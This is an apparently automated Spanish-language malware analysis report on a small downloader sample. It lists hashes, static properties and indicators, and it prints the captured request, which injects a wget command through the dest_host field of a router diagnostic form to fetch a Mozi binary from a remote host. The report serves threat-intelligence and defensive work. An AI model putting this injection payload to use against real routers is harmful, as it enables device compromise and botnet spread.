# 🧬 Payload Analysis

`9a25e64e679c52b3f0b5de245667f835a10ee5c5425f7f503f407122fc993356`

## 📌 Resumen

Texto ASCII de 118 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://124.29.247.XXX:48921/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://124.29.247.XXX:48921/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/9a25e64e679c52b3f0b5de245667f835a10ee5c5425f7f503f407122fc993356.md](../../../../../malware-like/oraculo/downloader/9a25e64e679c52b3f0b5de245667f835a10ee5c5425f7f503f407122fc993356.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:43:14.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `9a25e64e679c52b3f0b5de245667f835a10ee5c5425f7f503f407122fc993356`
- **SHA1:** `d520b3f1c5fa0478e2a1164bcb4930a212ce4617`
- **MD5:** `a300f588cc5100965dd782224446fe0c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.09 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://124.29.247.XXX:48921/Mozi.m+-O+->/tmp/gpon80
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://124.29.247.XXX:48921/Mozi.m+-O+- | strings |
| ip | 124.29.247.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://124.29.247.XXX:48921/Mozi.m+-O+->/tmp/gpon80 | strings |
| hash | 9a25e64e679c52b3f0b5de245667f835a10ee5c5425f7f503f407122fc993356 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
